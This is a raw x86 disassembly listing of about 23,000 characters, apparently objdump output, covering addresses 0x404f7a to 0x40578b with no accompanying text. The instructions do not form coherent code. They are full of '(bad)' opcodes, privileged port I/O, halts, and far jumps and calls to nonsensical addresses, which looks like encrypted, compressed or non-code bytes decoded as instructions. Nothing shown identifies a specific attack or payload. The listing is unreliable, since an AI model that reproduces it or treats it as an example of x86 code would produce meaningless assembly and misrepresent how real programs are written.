  404f7a:	cmp    ah,ah
  404f7c:	mov    ch,0x96
  404f7e:	pop    es
  404f7f:	test   al,0x88
  404f81:	mov    eax,0xc5c36a52
  404f86:	pusha  
  404f87:	enter  0xd729,0xfb
  404f8b:	mov    edi,0x6b3a9538
  404f90:	cmp    BYTE PTR [esi+0x2e],cl
  404f93:	sub    esi,eax
  404f95:	shl    BYTE PTR [esi],0xb5
  404f98:	pushf  
  404f99:	jmp    0x404f21
  404f9b:	int    0x0
  404f9d:	test   DWORD PTR [eax],esi
  404f9f:	jne    0x404f2d
  404fa1:	test   al,0x3e
  404fa3:	or     eax,0xeffa4d9
  404fa8:	jnp    0x405018
  404faa:	int3   
  404fab:	mov    ecx,0x5dff185b
  404fb0:	cmp    DWORD PTR [esi],eax
  404fb2:	sbb    dh,BYTE PTR [edi-0xdc8440c]
  404fb8:	xchg   ebx,eax
  404fb9:	outs   dx,DWORD PTR ds:[esi]
  404fba:	mov    edx,0xaced6ee4
  404fbf:	leave  
  404fc0:	das    
  404fc1:	cs and edi,edx
  404fc4:	pop    ecx
  404fc5:	aam    0x43
  404fc7:	clc    
  404fc8:	push   edx
  404fc9:	mov    BYTE PTR [ebx],ch
  404fcb:	retf   0xe00b
  404fce:	in     al,dx
  404fcf:	loopne 0x404fa3
  404fd1:	push   0x312263bd
  404fd6:	cs push edx
  404fd8:	jbe    0x404f95
  404fda:	cmp    BYTE PTR [ebx+eiz*4],cl
  404fdd:	retf   
  404fde:	inc    ebp
  404fdf:	leave  
  404fe0:	inc    esi
  404fe1:	popf   
  404fe2:	add    BYTE PTR [esi-0x27],dh
  404fe5:	mov    ch,0x21
  404fe7:	stc    
  404fe8:	ficom  DWORD PTR [ebp-0x2]
  404feb:	add    BYTE PTR [ecx+0x27],dh
  404fee:	(bad)  
  404fef:	lods   eax,DWORD PTR ds:[esi]
  404ff0:	adc    eax,0x123661ec
  404ff5:	inc    ebx
  404ff6:	jp     0x404fc1
  404ff8:	xor    al,BYTE PTR [ecx]
  404ffa:	mov    ebp,0xfdea289a
  404fff:	in     al,0xb1
  405001:	gs jae 0x404fee
  405004:	ror    BYTE PTR [ecx-0x33],0x3b
  405008:	cmp    esi,eax
  40500a:	mov    ecx,0x1dcb7f7c
  40500f:	outs   dx,BYTE PTR ds:[esi]
  405010:	icebp  
  405011:	pop    edi
  405012:	popf   
  405013:	outs   dx,BYTE PTR ds:[esi]
  405014:	mov    ds:0x481702b7,al
  405019:	mov    WORD PTR [esi-0x5d],?
  40501c:	push   ds
  40501d:	push   es
  40501e:	and    bh,BYTE PTR ds:[edi+0x5b2097f4]
  405025:	adc    DWORD PTR [edi+eax*4],0x69
  405029:	out    0xfc,al
  40502b:	fimul  DWORD PTR [ecx-0x6d]
  40502e:	and    BYTE PTR [eax],0x15
  405031:	js     0x405051
  405033:	sar    ecx,0x96
  405036:	out    0x6d,eax
  405038:	inc    esp
  405039:	sbb    cl,dh
  40503b:	mov    esi,0x75cea500
  405040:	pushf  
  405041:	hlt    
  405042:	push   ss
  405043:	adc    ch,BYTE PTR [esi+0x6c]
  405046:	cdq    
  405047:	mov    edx,esi
  405049:	xchg   DWORD PTR [esi+0x3064c1c4],ebx
  40504f:	sbb    esp,DWORD PTR [edi+0x2fe9eeac]
  405055:	int    0xa3
  405057:	cmp    ah,BYTE PTR [ecx]
  405059:	stos   BYTE PTR es:[edi],al
  40505a:	jne    0x4050c9
  40505c:	sbb    edi,DWORD PTR [esi+0x5e77e77e]
  405062:	rcr    dh,0x36
  405065:	or     DWORD PTR [eax+0x6f],esi
  405068:	sbb    ch,cl
  40506a:	inc    ecx
  40506b:	mov    ebx,0x71ef6b3b
  405070:	mov    ds:0x57291174,eax
  405075:	add    BYTE PTR [esi+0x7ef8d847],al
  40507b:	sub    eax,0x4e6b7617
  405080:	call   0xf2bbbdb3
  405085:	dec    eax
  405086:	push   ebp
  405087:	clc    
  405088:	cli    
  405089:	mov    bp,WORD PTR [esi]
  40508c:	pop    es
  40508d:	retf   
  40508e:	outs   dx,DWORD PTR ds:[esi]
  40508f:	adc    ebp,esp
  405091:	xor    esp,DWORD PTR [eax]
  405093:	push   ecx
  405094:	call   0x752c:0x2fd03476
  40509b:	push   ss
  40509c:	pop    ecx
  40509d:	xor    DWORD PTR [ebx-0x7c8adbc2],0x4d
  4050a4:	rcr    DWORD PTR [edi+0x12],0x69
  4050a8:	fisubr DWORD PTR [ecx]
  4050aa:	fs jne 0x4050dc
  4050ad:	fmulp  st(0),st
  4050af:	sub    cl,BYTE PTR [edx-0x14ec45b2]
  4050b5:	stc    
  4050b6:	push   cs
  4050b7:	or     al,BYTE PTR [eax-0x173c357c]
  4050bd:	adc    DWORD PTR [edx-0x242c1397],eax
  4050c3:	xchg   esp,eax
  4050c4:	jecxz  0x40509d
  4050c6:	add    ebx,DWORD PTR [ebx+0x36e12f42]
  4050cc:	mov    ds:0x906b94c8,eax
  4050d1:	shl    edx,1
  4050d3:	inc    ebp
  4050d4:	out    0xac,eax
  4050d6:	push   eax
  4050d7:	imul   ebx,DWORD PTR [ecx-0x5a],0x7ab79ca7
  4050de:	jp     0x405069
  4050e0:	inc    eax
  4050e1:	mov    ah,0x1f
  4050e3:	mov    eax,ds:0xaef40e23
  4050e8:	scas   al,BYTE PTR es:[edi]
  4050e9:	(bad)  
  4050ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050eb:	jle    0x40515f
  4050ed:	mov    ah,0x3e
  4050ef:	jg     0x405091
  4050f1:	mov    bl,0xdf
  4050f3:	fsubr  DWORD PTR [eax]
  4050f5:	push   ds
  4050f6:	mov    edi,0xd89eeb88
  4050fb:	adc    ecx,eax
  4050fd:	das    
  4050fe:	in     eax,0xcb
  405100:	ror    edi,cl
  405102:	mov    ecx,0xc7960737
  405107:	dec    esp
  405108:	imul   ebp,DWORD PTR [ebx+0x5c04aa76],0x88c02489
  405112:	lahf   
  405113:	in     al,0x24
  405115:	add    al,BYTE PTR ds:0xd4bce82f
  40511b:	inc    edi
  40511c:	xor    bl,BYTE PTR [ecx]
  40511e:	mov    bl,0xa5
  405120:	out    0xe,al
  405122:	mov    edx,0xb7fe4d1c
  405127:	and    DWORD PTR [edi],esp
  405129:	mov    bl,BYTE PTR [eax+0x73853a83]
  40512f:	hlt    
  405130:	jl     0x40516d
  405132:	mov    ss,WORD PTR [esi+0x62797478]
  405138:	out    0x2e,eax
  40513a:	test   BYTE PTR [esi+0x66],0x2e
  40513e:	ret    0x19d5
  405141:	jg     0x4050d3
  405143:	mov    ebx,0xcfb1ca1f
  405148:	pop    eax
  405149:	mov    cl,0xf7
  40514b:	sub    esi,DWORD PTR [ebx-0x1b]
  40514e:	mov    bl,BYTE PTR [eax]
  405150:	dec    ebp
  405151:	(bad)  
  405152:	mov    esp,0x8708c5df
  405157:	jns    0x405137
  405159:	push   ecx
  40515a:	(bad)  
  40515b:	pop    edi
  40515c:	jmp    0x4051d1
  40515e:	jecxz  0x405125
  405160:	dec    esp
  405161:	fs out 0x4a,eax
  405164:	sbb    DWORD PTR [ebx],0xffffffde
  405167:	adc    ah,bl
  405169:	test   BYTE PTR [ebx],0x75
  40516c:	jmp    0xdc6b4ed2
  405171:	not    BYTE PTR ds:0xa1d616e4
  405177:	rcl    BYTE PTR [bx+di+0x14f1],1
  40517c:	cmp    cl,BYTE PTR [ebx-0x5b]
  40517f:	or     DWORD PTR [edx],edx
  405181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405182:	addr16 jne 0x4051b8
  405185:	sub    BYTE PTR [esi+0x65],ah
  405188:	pop    ebp
  405189:	sbb    BYTE PTR [eax+0x4024da78],ah
  40518f:	sbb    ecx,DWORD PTR ds:0xafb46ddc
  405195:	cli    
  405196:	ret    0xfaa
  405199:	icebp  
  40519a:	mov    edi,0xb614c3db
  40519f:	ja     0x405191
  4051a1:	(bad)  
  4051a3:	xchg   DWORD PTR [edx],ebp
  4051a5:	stc    
  4051a6:	add    DWORD PTR [edx-0x332273a6],edx
  4051ac:	pop    es
  4051ad:	jno    0x4051cd
  4051af:	add    bl,BYTE PTR [eax]
  4051b1:	ja     0x4051c1
  4051b3:	sar    DWORD PTR [edx+0x22],1
  4051b6:	push   edi
  4051b7:	mov    ah,0xc1
  4051b9:	out    dx,eax
  4051ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051bb:	or     BYTE PTR [eax],ch
  4051bd:	xor    eax,0x72287f86
  4051c2:	nop
  4051c3:	xchg   esi,eax
  4051c4:	cmp    al,0x9e
  4051c6:	stc    
  4051c7:	inc    ecx
  4051c8:	inc    BYTE PTR [eax]
  4051ca:	addr16 xchg edi,eax
  4051cc:	jnp    0x4051af
  4051ce:	add    al,0x48
  4051d0:	je     0x40516a
  4051d2:	xchg   edi,ebx
  4051d4:	inc    ecx
  4051d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051d6:	aam    0xf9
  4051d8:	push   0xb4c0568f
  4051dd:	xorps  xmm2,xmm2
  4051e0:	imul   eax,DWORD PTR [ebx],0xe9b42a8d
  4051e6:	adc    DWORD PTR [edi+edi*8-0x4f545e9f],ecx
  4051ed:	or     eax,0x49a8f4d5
  4051f2:	sub    eax,0xa362c323
  4051f7:	loop   0x405203
  4051f9:	out    dx,al
  4051fa:	or     edx,esi
  4051fc:	hlt    
  4051fd:	mov    edi,0xa1557f13
  405202:	pop    edi
  405203:	pop    eax
  405204:	sbb    DWORD PTR [edi],ecx
  405206:	xchg   esi,eax
  405207:	cdq    
  405208:	hlt    
  405209:	dec    eax
  40520a:	dec    ecx
  40520b:	aaa    
  40520c:	mov    al,ds:0x259a04d1
  405211:	ins    DWORD PTR es:[edi],dx
  405212:	mov    BYTE PTR ss:[ecx+0x19],bl
  405216:	pop    ds
  405217:	push   ebx
  405218:	mov    esi,0x4ea7d0d5
  40521d:	into   
  40521e:	adc    al,0xdc
  405220:	fwait
  405221:	sbb    DWORD PTR [eax],0x60
  405224:	inc    eax
  405225:	mov    eax,ds:0xc48a8600
  40522a:	mov    dl,al
  40522c:	lds    eax,FWORD PTR [edi+ecx*2+0x607ad0e]
  405233:	(bad)  
  405234:	xor    DWORD PTR [edi-0x6c],ebp
  405237:	fidivr DWORD PTR [ecx+eax*8]
  40523a:	fdiv   st,st(1)
  40523c:	clc    
  40523d:	jg     0x40521a
  40523f:	mov    WORD PTR [ecx],ds
  405241:	adc    eax,0x423a8d87
  405246:	mov    esi,0x8a7763
  40524b:	pop    ebp
  40524c:	call   0xc2904804
  405251:	jne    0x4051d6
  405253:	stos   DWORD PTR es:[edi],eax
  405254:	in     al,dx
  405255:	(bad)  
  405256:	fucomip st,st(7)
  405258:	adc    BYTE PTR ds:0x6f59ec66,0x39
  40525f:	fnsave ds:0xd3827680
  405265:	inc    esi
  405266:	pushf  
  405267:	sub    bh,BYTE PTR [eax+0x2fd6ffb6]
  40526d:	adc    BYTE PTR [ebx],dl
  40526f:	mov    ebp,0x842125fa
  405274:	pop    esi
  405275:	jo     0x405263
  405277:	ja     0x405246
  405279:	leave  
  40527a:	ret    0x3738
  40527d:	cdq    
  40527e:	inc    ebx
  40527f:	imul   eax,edx,0xf1ac9c2f
  405285:	or     eax,0x714a0390
  40528a:	data16 cld 
  40528c:	xchg   esp,eax
  40528d:	aas    
  40528e:	leave  
  40528f:	call   0xbd83:0x21397f6e
  405296:	pop    ecx
  405297:	xor    DWORD PTR [ebx+0x42f55220],ecx
  40529d:	push   edx
  40529e:	pop    esi
  40529f:	xchg   esi,eax
  4052a0:	fsub   QWORD PTR [esi-0x8]
  4052a3:	(bad)  
  4052a4:	push   0xe15337aa
  4052a9:	sub    al,0xf2
  4052ab:	mov    ah,0x85
  4052ad:	mov    eax,ds:0xb5c46060
  4052b2:	cs mov bh,0xf5
  4052b5:	bound  edi,QWORD PTR gs:[edx-0x79]
  4052b9:	repnz mov WORD PTR [edi-0x59],?
  4052bd:	push   0x4971f605
  4052c2:	xchg   ecx,eax
  4052c3:	out    0x73,eax
  4052c5:	lock cmp BYTE PTR [ecx+0x625ca3cc],ah
  4052cc:	mov    ecx,0x6ff5a4ea
  4052d1:	mov    cl,0x1
  4052d3:	dec    eax
  4052d4:	xchg   esi,eax
  4052d5:	mov    gs,esi
  4052d7:	cmp    edx,DWORD PTR [edi-0x6c]
  4052da:	leave  
  4052db:	add    DWORD PTR [eax+0x7],ebx
  4052de:	or     al,0xe
  4052e0:	sub    dh,BYTE PTR [ecx-0x63348127]
  4052e6:	leave  
  4052e7:	and    eax,0xfef53f3
  4052ec:	out    dx,al
  4052ed:	sbb    eax,0xdf20e66a
  4052f2:	push   esp
  4052f3:	(bad)  
  4052f5:	sub    edi,DWORD PTR [edx+0x24]
  4052f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052f9:	fwait
  4052fa:	adc    al,0xe6
  4052fc:	xor    DWORD PTR [esi+0x1865da4a],esp
  405302:	pop    ebp
  405303:	sub    BYTE PTR ds:0xe97b31da,bl
  405309:	test   BYTE PTR [esi],bl
  40530b:	jl     0x40530d
  40530d:	jle    0x40533a
  40530f:	mov    cl,0xac
  405311:	aas    
  405312:	stos   DWORD PTR es:[edi],eax
  405313:	gs cmp al,0x6c
  405316:	xor    eax,ebx
  405318:	aas    
  405319:	ja     0x4052d6
  40531b:	mov    ah,0xc6
  40531d:	rol    BYTE PTR [ecx-0x76],0x7
  405321:	xchg   dx,ax
  405323:	jg     0x4052de
  405325:	inc    ebp
  405326:	jb     0x4052e9
  405328:	cmp    dh,ah
  40532a:	arpl   WORD PTR [eax],ax
  40532c:	push   ebx
  40532d:	pop    eax
  40532e:	add    DWORD PTR [eax],eax
  405330:	and    cl,BYTE PTR [edx+0x5a8d05df]
  405336:	sahf   
  405337:	int3   
  405338:	mov    DWORD PTR [ebx-0x5c9e6f],ebp
  40533e:	or     eax,0x37e1cb46
  405343:	mov    dl,0xc1
  405345:	adc    bh,BYTE PTR cs:[ecx]
  405348:	mov    ds:0xf81ca9b5,al
  40534d:	pop    esi
  40534e:	popa   
  40534f:	lods   al,BYTE PTR ds:[esi]
  405350:	idiv   BYTE PTR [ecx+0x6d236e71]
  405356:	pushf  
  405357:	add    DWORD PTR [esi-0x31],0x4a7659e9
  40535e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40535f:	push   eax
  405360:	(bad)  
  405361:	xor    edi,DWORD PTR [ebp-0x2]
  405364:	or     eax,0x678d86ca
  405369:	dec    eax
  40536a:	sbb    esp,DWORD PTR [ecx]
  40536c:	test   DWORD PTR [esi],0xb3398436
  405372:	lods   al,BYTE PTR ds:[esi]
  405373:	xchg   esi,eax
  405374:	jne    0x4053cc
  405376:	test   ah,bh
  405378:	retf   
  405379:	inc    ebx
  40537a:	sub    al,0x88
  40537c:	push   edi
  40537d:	pop    ebx
  40537e:	mov    dl,0x3d
  405380:	mov    eax,0x2b63cda6
  405385:	jbe    0x4053b0
  405387:	hlt    
  405388:	icebp  
  405389:	or     eax,0x1866d2e2
  40538e:	jg     0x405373
  405390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405391:	push   0xffffffc7
  405393:	push   edx
  405394:	sbb    al,0x6e
  405396:	std    
  405397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405398:	outs   dx,BYTE PTR ds:[esi]
  405399:	push   esp
  40539a:	mov    ds:0xaf3dd46a,eax
  40539f:	jecxz  0x40538b
  4053a1:	mov    ah,0x2a
  4053a3:	hlt    
  4053a4:	add    edi,DWORD PTR [eax-0x385afb9c]
  4053aa:	stc    
  4053ab:	fild   WORD PTR [edx-0x5f]
  4053ae:	ja     0x40538f
  4053b0:	in     eax,dx
  4053b1:	mov    cl,0xa7
  4053b3:	xor    edx,DWORD PTR [ecx-0x24]
  4053b6:	out    0x5f,eax
  4053b8:	xor    cl,BYTE PTR [ebx+eax*4]
  4053bb:	repnz ror DWORD PTR [esi],1
  4053be:	outs   dx,BYTE PTR ds:[esi]
  4053bf:	ret    
  4053c0:	pop    edx
  4053c1:	leave  
  4053c2:	sbb    ch,bh
  4053c4:	sbb    al,BYTE PTR [ebp-0x5c001d69]
  4053ca:	add    DWORD PTR [ecx+0x8],esi
  4053cd:	pop    ss
  4053ce:	pop    ss
  4053cf:	xchg   esi,eax
  4053d0:	adc    bl,BYTE PTR [edi+0x137adc8c]
  4053d6:	retf   
  4053d7:	scas   eax,DWORD PTR es:[edi]
  4053d8:	mov    edx,0x60c743c5
  4053dd:	enter  0x2330,0xb4
  4053e1:	mov    dh,0xc4
  4053e3:	push   edi
  4053e4:	xor    cl,cl
  4053e6:	inc    DWORD PTR [edi]
  4053e8:	mov    dl,0xeb
  4053ea:	js     0x40545e
  4053ec:	fxch   st(3)
  4053ee:	clc    
  4053ef:	and    DWORD PTR [ecx-0x215487cc],ebp
  4053f5:	lods   eax,DWORD PTR ds:[esi]
  4053f6:	loope  0x405381
  4053f8:	jle    0x405395
  4053fa:	mov    ah,0x2a
  4053fc:	xor    DWORD PTR [ebx+eiz*4-0x12],esi
  405400:	xor    al,0x1
  405402:	or     ebp,DWORD PTR ds:0x833c0c31
  405408:	cwde   
  405409:	mov    edi,0xd3070ee0
  40540e:	adc    al,0x5a
  405410:	xor    DWORD PTR [edx-0x51],ebp
  405413:	pop    esi
  405414:	in     eax,dx
  405415:	clc    
  405416:	sub    al,0xf5
  405418:	aad    0xfb
  40541a:	dec    ecx
  40541b:	pop    esi
  40541c:	add    eax,0xf0676bf8
  405421:	aas    
  405422:	pop    es
  405423:	sub    al,0xd3
  405425:	imul   edx,DWORD PTR [ecx-0x34],0x1501e64e
  40542c:	mov    dh,al
  40542e:	int3   
  40542f:	push   edx
  405430:	ror    BYTE PTR [eax+0x65],1
  405433:	and    BYTE PTR [eax+0x1e],dh
  405436:	or     ah,BYTE PTR [ebx-0x4e63d549]
  40543c:	out    0x2e,al
  40543e:	sbb    eax,0x1837aa9d
  405443:	in     al,dx
  405444:	js     0x405445
  405446:	stos   DWORD PTR es:[edi],eax
  405447:	xor    bh,BYTE PTR [edx]
  405449:	int3   
  40544a:	jmp    0x4873:0x3043d17a
  405451:	ror    BYTE PTR [ecx+0x1f],1
  405454:	push   eax
  405455:	dec    eax
  405456:	jle    0x405424
  405458:	pop    esp
  405459:	pop    edx
  40545a:	jae    0x4053e5
  40545c:	pop    esi
  40545d:	jl     0x40544c
  40545f:	xchg   edx,eax
  405460:	push   edi
  405461:	cmp    ch,0x77
  405464:	push   ecx
  405465:	(bad)  
  405467:	mov    dl,0xe3
  405469:	nop
  40546a:	mov    edx,DWORD PTR [edx-0x6]
  40546d:	shl    DWORD PTR [eax-0x43beedbc],1
  405473:	hlt    
  405474:	inc    edi
  405475:	mov    ecx,DWORD PTR [eax-0x2178b13e]
  40547b:	shr    DWORD PTR [eax-0x173a12e9],cl
  405481:	sbb    al,0xa4
  405483:	mov    eax,ds:0x11631118
  405488:	retf   
  405489:	xchg   edi,eax
  40548a:	add    al,0xe
  40548c:	adc    eax,0xa40c52fa
  405491:	mov    ds:0x31e4f1bc,al
  405496:	imul   ebx,edi,0x6b5d7fb5
  40549c:	repnz fild QWORD PTR [ebp-0x23f1f3a4]
  4054a3:	xor    DWORD PTR [ebp*2-0x7a5d4a53],ebx
  4054aa:	xor    BYTE PTR [edx],bl
  4054ac:	mov    al,0xcd
  4054ae:	sbb    eax,0x2912b229
  4054b3:	jbe    0x405497
  4054b5:	push   0x55
  4054b7:	popaw  
  4054b9:	fiadd  DWORD PTR [eax]
  4054bb:	mov    ebp,0x5803910d
  4054c0:	sub    al,0x53
  4054c2:	push   0xfffffff2
  4054c4:	(bad)  
  4054c5:	loop   0x4054f1
  4054c7:	cmp    al,0x25
  4054c9:	loop   0x40550e
  4054cb:	mov    eax,0xcb55731c
  4054d0:	sub    dh,BYTE PTR [eax-0x192b1e14]
  4054d6:	out    0x54,eax
  4054d8:	sbb    BYTE PTR ds:0x8d42e1ec,0xef
  4054df:	adc    DWORD PTR [esi],edi
  4054e1:	pop    esi
  4054e2:	xchg   ecx,eax
  4054e3:	or     al,0x9b
  4054e5:	loop   0x405481
  4054e7:	popa   
  4054e8:	dec    esp
  4054e9:	iret   
  4054ea:	jns    0x4054d2
  4054ec:	in     eax,dx
  4054ed:	adc    dl,0x80
  4054f0:	gs hlt 
  4054f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054f3:	les    eax,FWORD PTR [eax+0x71]
  4054f6:	add    bl,BYTE PTR [edi]
  4054f8:	icebp  
  4054f9:	das    
  4054fa:	cwde   
  4054fb:	enter  0x61a8,0xac
  4054ff:	in     eax,0x81
  405501:	fs jbe 0x40554c
  405504:	loop   0x405563
  405506:	pop    edi
  405507:	int    0x9c
  405509:	xchg   DWORD PTR [edx+ecx*2+0x17878268],edi
  405510:	cmp    eax,0x1504c2bd
  405515:	idiv   DWORD PTR [esi+eax*2+0x24d40c37]
  40551c:	jge    0x4054eb
  40551e:	in     al,0x87
  405520:	and    bh,al
  405522:	sar    DWORD PTR [esi],0xba
  405525:	push   esi
  405526:	leave  
  405527:	std    
  405528:	inc    edx
  405529:	add    DWORD PTR [edi+eiz*4],0xcd9ef602
  405530:	xchg   BYTE PTR [esp+ebx*8],bl
  405533:	js     0x40550c
  405535:	sub    ecx,DWORD PTR [ebp+edi*1+0x62]
  405539:	or     ch,BYTE PTR [ecx]
  40553b:	(bad)  
  40553c:	push   ss
  40553d:	pushf  
  40553e:	outs   dx,BYTE PTR ds:[esi]
  40553f:	adc    ebx,DWORD PTR [ecx+edi*1+0x51]
  405543:	add    DWORD PTR [edx+eiz*1],ebx
  405546:	icebp  
  405547:	push   DWORD PTR [eax+0x7c]
  40554a:	push   0x6ef6a436
  40554f:	loopne 0x4054e1
  405551:	mov    al,0xdb
  405553:	mov    eax,ds:0xef2bee70
  405558:	mov    esi,0x8781c6a7
  40555d:	aas    
  40555e:	mov    esi,ebp
  405560:	jle    0x405579
  405562:	xor    al,0xc8
  405564:	mov    ebp,0x667bc39a
  405569:	jmp    FWORD PTR [edi]
  40556b:	xchg   esi,eax
  40556c:	iret   
  40556d:	aas    
  40556e:	rcl    DWORD PTR es:[ebx-0x393c2315],cl
  405575:	pop    ss
  405576:	retf   0xfc66
  405579:	pop    esi
  40557a:	(bad)  
  40557b:	jnp    0x40555b
  40557d:	sub    ecx,ebx
  40557f:	mov    eax,0x69f2113d
  405584:	cli    
  405585:	shl    DWORD PTR [esi+0x73a5252b],cl
  40558b:	jae    0x405538
  40558d:	jno    0x4055f4
  40558f:	out    0xeb,al
  405591:	jl     0x405524
  405593:	adc    esp,eax
  405595:	mov    cs,ebx
  405597:	mov    dl,0xd
  405599:	call   0xb464:0x7e209839
  4055a0:	ss ror ebx,0xb7
  4055a4:	icebp  
  4055a5:	clc    
  4055a6:	cwde   
  4055a7:	pop    edx
  4055a8:	adc    eax,DWORD PTR gs:[edi]
  4055ab:	das    
  4055ac:	imul   eax,DWORD PTR [ebp-0x3e4c7dfc],0x812ab3a6
  4055b6:	add    BYTE PTR [edi+0x479f603f],cl
  4055bc:	inc    ebp
  4055bd:	(bad)
  4055c1:	test   al,0xc9
  4055c3:	xchg   BYTE PTR [esi],ah
  4055c5:	rcr    BYTE PTR [edx+ecx*8+0x256b02a0],0xeb
  4055cd:	add    dl,BYTE PTR [ebx]
  4055cf:	dec    edi
  4055d0:	jmp    0x92e:0xd110594f
  4055d7:	stos   DWORD PTR es:[edi],eax
  4055d8:	fimul  WORD PTR [ecx-0x2a]
  4055db:	imul   ebx,edi,0x49d91072
  4055e1:	adc    DWORD PTR ss:[ecx-0x7e4edc0d],edx
  4055e8:	add    eax,DWORD PTR [edx]
  4055ea:	mov    cl,0x25
  4055ec:	xor    al,0x51
  4055ee:	push   0x9e597919
  4055f3:	dec    esi
  4055f4:	les    ecx,FWORD PTR [edx+0x6b]
  4055f7:	inc    esp
  4055f8:	xchg   ecx,eax
  4055f9:	cmp    DWORD PTR [ecx+0x32],0x8c622b0d
  405600:	mov    dl,0xa5
  405602:	fistp  QWORD PTR [eax]
  405604:	pop    ds
  405605:	scas   eax,DWORD PTR es:[edi]
  405606:	shl    DWORD PTR [ebx+0x39d72307],0xdd
  40560d:	(bad)  
  40560f:	jae    0x4055b0
  405611:	mov    ds:0xa89ad16f,al
  405616:	mov    al,ds:0x6a26fcd
  40561b:	push   ds
  40561c:	icebp  
  40561d:	jnp    0x4055c2
  40561f:	repz cld 
  405621:	bound  ebx,QWORD PTR [ebp+ebx*2-0x24]
  405625:	mov    esi,0xfda3387c
  40562a:	push   ss
  40562b:	imul   ebx,DWORD PTR [eax+eax*1+0x2],0x3923c821
  405633:	xchg   ecx,eax
  405634:	imul   eax,DWORD PTR [esp+eiz*2+0x2dc42fe3],0x6c
  40563c:	jno    0x40564c
  40563e:	lods   eax,DWORD PTR ds:[esi]
  40563f:	inc    edx
  405640:	test   al,0xaa
  405642:	cmp    DWORD PTR [edx+0x3ce5de23],ebp
  405648:	adc    eax,0x7ca6ce06
  40564d:	mov    es,WORD PTR [eax]
  40564f:	fsubp  st(0),st
  405651:	mov    edi,0xb235507e
  405656:	nop
  405657:	into   
  405658:	inc    ebx
  405659:	mov    dl,0x94
  40565b:	dec    esi
  40565c:	fidivr DWORD PTR [esi+0x3ef1b9b5]
  405662:	ds or  al,0x65
  405665:	xor    eax,0x472e3fed
  40566a:	cs xor al,0xa4
  40566d:	pop    edx
  40566e:	jmp    0x405637
  405670:	adc    al,0xdb
  405673:	pop    esi
  405674:	sub    dl,cl
  405676:	mov    esi,0x658acc51
  40567b:	pop    esp
  40567c:	arpl   WORD PTR [eax],bx
  40567e:	ss cmc 
  405680:	pop    ebp
  405681:	xchg   BYTE PTR [ecx+0x67],ah
  405684:	xor    BYTE PTR [eax],ah
  405686:	xor    BYTE PTR [esi+0x5aa8931e],0x5a
  40568d:	ds pop esp
  40568f:	add    bl,BYTE PTR [ecx+0x2502eb74]
  405695:	repnz pop ds
  405697:	xchg   ebp,eax
  405698:	popa   
  405699:	out    dx,al
  40569a:	into   
  40569b:	push   0x5076e7ea
  4056a0:	arpl   WORD PTR [edi-0x33],cx
  4056a3:	xor    BYTE PTR [edx-0x2d],cl
  4056a6:	je     0x40569d
  4056a8:	dec    esi
  4056a9:	mov    dl,0xe3
  4056ab:	mov    ecx,0xb0da24b0
  4056b0:	jmp    0x54f8:0x27115557
  4056b7:	daa    
  4056b8:	jbe    0x405723
  4056ba:	sub    eax,0x84e4aa6
  4056bf:	mov    esi,DWORD PTR [esi]
  4056c1:	enter  0x47f3,0x38
  4056c5:	leave  
  4056c6:	fldenv [ebx-0xa4ffc3c]
  4056cc:	retf   
  4056cd:	push   ebp
  4056ce:	fld    st(1)
  4056d0:	mov    ecx,0x446c5366
  4056d5:	lds    edx,FWORD PTR es:0xf605d749
  4056dc:	mov    edi,0xf6da933d
  4056e1:	jp     0x405671
  4056e3:	and    DWORD PTR [bx+si-0x5809],0x1e
  4056e9:	sbb    cl,cl
  4056eb:	arpl   WORD PTR [ecx-0x67],cx
  4056ee:	rcr    DWORD PTR [eax+esi*2],0x96
  4056f2:	fisubr DWORD PTR [edx+0x4]
  4056f5:	push   edi
  4056f6:	out    dx,eax
  4056f7:	adc    BYTE PTR [ebx+0x2c],dh
  4056fa:	xchg   esp,edi
  4056fc:	cld    
  4056fd:	dec    ebx
  4056fe:	add    eax,0x689c606d
  405703:	cwde   
  405704:	push   edx
  405705:	push   ebp
  405706:	jmp    0x81e8e1c2
  40570b:	js     0x4056ba
  40570d:	and    DWORD PTR [eax+0x5b84c906],ebx
  405713:	dec    esi
  405714:	mov    ah,0x24
  405716:	sub    DWORD PTR [ebx],ecx
  405718:	stc    
  405719:	data16 and al,0xbd
  40571c:	dec    edx
  40571d:	sahf   
  40571e:	(bad)  
  40571f:	sub    al,BYTE PTR [eax-0x68]
  405722:	push   ss
  405723:	add    al,0x2a
  405725:	ja     0x405753
  405727:	aaa    
  405728:	outs   dx,BYTE PTR ds:[esi]
  405729:	mov    eax,?
  40572b:	mov    eax,0xdfbe34c9
  405730:	inc    esp
  405731:	push   ecx
  405732:	leave  
  405733:	lahf   
  405734:	xchg   ebp,eax
  405735:	popa   
  405736:	push   0xc4da6d69
  40573b:	ins    DWORD PTR es:[edi],dx
  40573c:	inc    esi
  40573d:	pusha  
  40573e:	jle    0x405749
  405740:	test   DWORD PTR [ebp-0x39917c72],edx
  405746:	sub    al,0x81
  405748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405749:	pop    esi
  40574a:	loopne 0x4056f7
  40574c:	dec    ebx
  40574d:	pop    edx
  40574e:	mov    cl,0x7e
  405751:	je     0x4056d9
  405753:	mov    dl,0x66
  405755:	nop
  405756:	loope  0x40577c
  405758:	fmul   DWORD PTR ds:[ebp-0x3b]
  40575c:	aas    
  40575d:	xchg   DWORD PTR [edi],edi
  40575f:	mov    WORD PTR [ebp+0x28],ds
  405762:	jne    0x405726
  405764:	in     al,dx
  405765:	push   ebp
  405766:	add    ch,BYTE PTR [eax+0x2c41a3b1]
  40576c:	inc    ebp
  40576d:	push   esp
  40576e:	es std 
  405770:	pushf  
  405771:	out    0xd8,al
  405773:	cmp    BYTE PTR [esi],bl
  405775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405776:	clc    
  405777:	lods   eax,DWORD PTR ds:[esi]
  405778:	jl     0x4057c9
  40577a:	jp     0x405759
  40577c:	shl    ebx,cl
  40577e:	add    dh,bh
  405780:	jmp    0x7671bd48
  405785:	mov    ds:0x4c11b964,al
  40578a:	xchg   esi,eax
  40578b:	lds    esi,FWORD PTR [ebp+0x13]
